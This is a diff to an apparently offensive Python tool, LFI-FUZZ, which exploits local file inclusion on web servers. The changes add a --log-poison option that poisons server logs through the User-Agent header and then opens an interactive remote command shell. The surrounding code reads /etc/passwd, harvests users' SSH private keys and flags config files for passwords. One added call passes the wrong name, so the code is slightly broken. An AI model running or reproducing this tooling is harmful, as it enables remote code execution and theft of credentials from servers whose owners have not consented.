@@ -5,6 +5,9 @@ import re
 from base64 import b64decode
 import time 
 
+'''
+ADD AN OPTION TO FUZZ PARAMTERS TOO, NOT JUST THE LFI - allows for more dynamic testing.
+'''
 
 USER_AGENT = {"User-Agent":"LFI-FUZZ/1.0"}
 
@@ -19,6 +22,13 @@ def validate_url(url):
 
     if "LFI" not in url:
         url += "LFI"
+        
+    try:
+        print("[*] - ATTEMPTING TO CONNECT TO URL...")
+        requests.get(url, timeout=3)
+    except:
+        print("[-] - THE URL ENTERED CANNOT BE CONNECTED TO... SORRY... EXITTING")
+        sys.exit(1)
 
     return url
 
@@ -155,19 +165,23 @@ def extract_users(url, traversal):
         print("[-] - UNFORTUNATELY THE /ETC/PASSWD FILE COULD NOT BE ACCESSED...")
 
 
-def log_poison_check(url, traversal, logfile):
+def log_poison_check(url, traversal, logfile, log_poison_option):
     '''checks if log poisoning is possible'''
-    resp = read_file(url, traversal, logfile, quiet=True)
-    if (resp and USER_AGENT["User-Agent"] in resp) or USER_AGENT["User-Agent"] in make_request(url, traversal, logfile)[0].text:
-        print("[!] - LOG POISONING POSSIBLE WITH USER AGENT FIELD! POISONING FILE...")
+    print("[*] - CHECKING IF LOG POISONING IS POSSIBLE...")
+    #resp = read_file(url, traversal, logfile, quiet=True)
+    #if (resp and USER_AGENT["User-Agent"] in resp) or USER_AGENT["User-Agent"] in make_request(url, traversal, logfile)[0].text:
+    if USER_AGENT["User-Agent"] in make_request(url, traversal, logfile)[0].text:
+        print("[!] - LOG POISONING POSSIBLE WITH USER AGENT FIELD!")
+        if log_poison_option:
+            print("[*] - POISONING FILE...")
+            time.sleep(1)
+            log_poison(url, traversal, logfile)
 
-        log_poison(url, traversal, logfile)
-
-        while True:
-            user_cmd = input("\nSHELL> ")
-            if user_cmd.upper() == "QUIT" or user_cmd.upper() == "EXIT":
-                break
-            log_poison_shell(url, traversal+logfile, user_cmd)
+            while True:
+                user_cmd = input("\nSHELL> ")
+                if user_cmd.upper() == "QUIT" or user_cmd.upper() == "EXIT":
+                    break
+                log_poison_shell(url, traversal+logfile, user_cmd)
     else:
         print("[!] - POTENTIAL LOG POISONING POSSIBLE - CHECK WHAT IS SHOWN IN THIS FILE THAT YOU CAN CONTROL - EG: USER AGENT STRING, or REFERRER")
 
@@ -208,6 +222,7 @@ def main():
     arg_parser.add_option("--filter", dest="filter_str", help="An error string that appears commonly on the page when you try to load in an invalid file: 'ERROR - cannot find'. NOTE - this is case sensitive")
     arg_parser.add_option("--custom-file-list", dest="custom_list", help="Specify your own list of files to attempt to find through the LFI")
     arg_parser.add_option("--read-file", dest="file_to_read", help="Specify your own file to attempt to read through the LFI - must specify absolute path: passwd is not enough to get the /etc/passwd")
+    arg_parser.add_option("--log-poison", dest="log_poison_option", help="Providing this parameter tells LFI-FUZZ to exploit log poisoning for you if it can...: --log-poison=1 (0 by default, and wont auto exploit by default)")
 
     (options, args) = arg_parser.parse_args()
 
@@ -239,6 +254,10 @@ def main():
     file_to_read = "" 
     if options.file_to_read:
         file_to_read = options.file_to_read
+        
+    log_poison_option = False
+    if options.log_poison_option == "1":
+    	log_poison_option = True
 
     #attempting to read source code of the current page so we can discover any filters or blacklists in place
     page = "/".join(url.split("/")[3:]).split("?")[0]
@@ -274,12 +293,14 @@ def main():
             print("\n[+] - SUCCESSFUL LFI: " + this_url)
             time.sleep(0.5)
             if "log" in f:
-                log_poison_check(url, traversal, f)
+                log_poison_check(url, traversal, f, log_poison)
             if "conf" in f:
                 print("[!] - CONFIG FILE - READ FOR POTENTIAL PASSWORDS!")
 
     # extract the users from /etc/passwd and see if we cna find their SSH dir
     home_dirs = extract_users(url, traversal)
+    if not home_dirs:
+        sys.exit(1)
     for directory in home_dirs:
         users_key = directory + "/.ssh/id_rsa"
         ssh_key_b64 = read_page(url, traversal + users_key, quiet=True)
@@ -288,7 +309,6 @@ def main():
             print(b64decode(ssh_key_b64).decode())
         else:
             print("[-] - UNABLE TO ACCESS THE FILE " + users_key)
-   
 
 
 if __name__ == "__main__":
